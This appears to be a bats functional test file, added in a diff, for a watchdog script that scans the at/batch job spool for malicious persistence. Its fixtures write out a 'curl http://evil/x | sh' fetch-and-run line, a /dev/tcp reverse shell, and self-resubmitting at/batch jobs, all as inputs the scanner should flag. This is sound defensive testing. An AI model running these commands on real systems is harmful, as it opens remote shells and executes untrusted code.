@@ -1,0 +1,160 @@
+#!/usr/bin/env bats
+# L2 bats functional tests for the at-jobs-watchdog scan script.
+#
+# Covers the at/batch scheduler-persistence surface (the sibling of cron
+# that cron-job-watchdog does not see): atd runs each spooled job AS ITS
+# OWNER at the scheduled time. High-signal cases are a job body that
+# re-submits itself (`at`/`batch` inside the job — a self-perpetuating
+# loop) or one carrying a reverse shell / fetch-pipe-shell / tmp payload.
+#
+# Notably this LOCKS the module-specific pattern that SDD-061 D-6 preserved
+# verbatim as a PATTERNS+=(...) extra — the at/batch self-resubmission
+# pattern `(^|[;&|`$(][[:space:]]*)(at|batch)[[:space:]]` — proving the
+# preserved-extra still detects after the migration onto module-lib.
+#
+# Runs the actual scan script with `logger` shadowed on PATH and the spool
+# + baseline in a tmp sandbox via SELFDEF_ATJOBS_*; locks the
+# `"severity":"alert"` token SDD-062 routes on + the D-6 fail-loud path.
+#
+# Run with: bats packaging/test/L2-at-jobs-watchdog.bats
+
+WD="${BATS_TEST_DIRNAME}/../../modules/at-jobs-watchdog/systemd/at-jobs-watchdog.sh"
+LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"
+
+setup() {
+    TMP="$(mktemp -d)"
+    BIN="${TMP}/bin"; mkdir -p "${BIN}"
+    cat > "${BIN}/logger" <<'FAKELOGGER'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
+FAKELOGGER
+    chmod +x "${BIN}/logger"
+    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    BASELINE="${TMP}/baseline.tsv"
+    SPOOL="${TMP}/spool"; mkdir -p "${SPOOL}"
+    JOB="${SPOOL}/a00001"
+    NOACL="${TMP}/nonexistent-acl"
+}
+
+teardown() { rm -rf "${TMP}"; }
+
+# SPOOLS/ACLS use :- defaults, so override with non-empty values: a real
+# spool dir and a nonexistent ACL path (so no ACL is picked up).
+run_wd() {
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_ATJOBS_PROFILE="${PROFILE:-report}" \
+    SELFDEF_ATJOBS_BASELINE="${BASELINE}" \
+    SELFDEF_ATJOBS_SPOOLS="${SPOOLS:-$SPOOL}" \
+    SELFDEF_ATJOBS_ACLS="${NOACL}" \
+    bash "${WD}"
+}
+
+cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
+
+# ============================================================
+# ok tier
+# ============================================================
+
+@test "no at spool present → ok / no_at_spool" {
+    SPOOLS="${TMP}/nospool" run_wd
+    cap | grep -q '"event":"no_at_spool"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "benign job, first run → ok / baseline_initial" {
+    printf '#!/bin/sh\nexport HOME=/root\n/usr/bin/backup.sh --nightly\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -q '"severity":"ok"'
+    [ -f "${BASELINE}" ]
+}
+
+@test "unchanged spool on second run → ok / at_jobs_intact" {
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"at_jobs_intact"'
+    cap | grep -q '"severity":"ok"'
+}
+
+# ============================================================
+# alert tier — incl. the PRESERVED at/batch self-resubmit extra
+# ============================================================
+
+@test "job that re-submits itself via at → alert (preserved extra pattern)" {
+    printf '#!/bin/sh\n/usr/bin/work.sh\nat now + 1 hour < /root/.relaunch\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "job that re-arms via batch → alert (preserved extra pattern)" {
+    printf '#!/bin/sh\nbatch <<EOF\n/usr/bin/work.sh\nEOF\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "job body with a curl|sh payload → alert (canonical pattern)" {
+    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "job body with a /dev/tcp reverse shell → alert (canonical pattern)" {
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+# ============================================================
+# warn tier
+# ============================================================
+
+@test "benign job added after baseline → warn / at_jobs_changed" {
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    printf '#!/bin/sh\n/usr/bin/report.sh\n' > "${SPOOL}/a00002"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"at_jobs_changed"'
+    cap | grep -q '"severity":"warn"'
+}
+
+# ============================================================
+# false-positive guards
+# ============================================================
+
+@test "benign job with only absolute commands is NOT flagged" {
+    printf '#!/bin/sh\n/usr/bin/rsync -a /data /backup\n/usr/bin/logger done\n' > "${JOB}"
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "a commented-out self-resubmit line is NOT flagged" {
+    printf '#!/bin/sh\n# at now + 1 day < /root/x\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+    cap | grep -q '"severity":"ok"'
+}
+
+# ============================================================
+# enforce profile + SDD-061 D-6 fail-loud
+# ============================================================
+
+@test "enforce profile exits non-zero on an alert" {
+    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${JOB}"
+    PROFILE=enforce run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"event":"module_lib_missing"'
+    cap | grep -q '"severity":"alert"'
+}
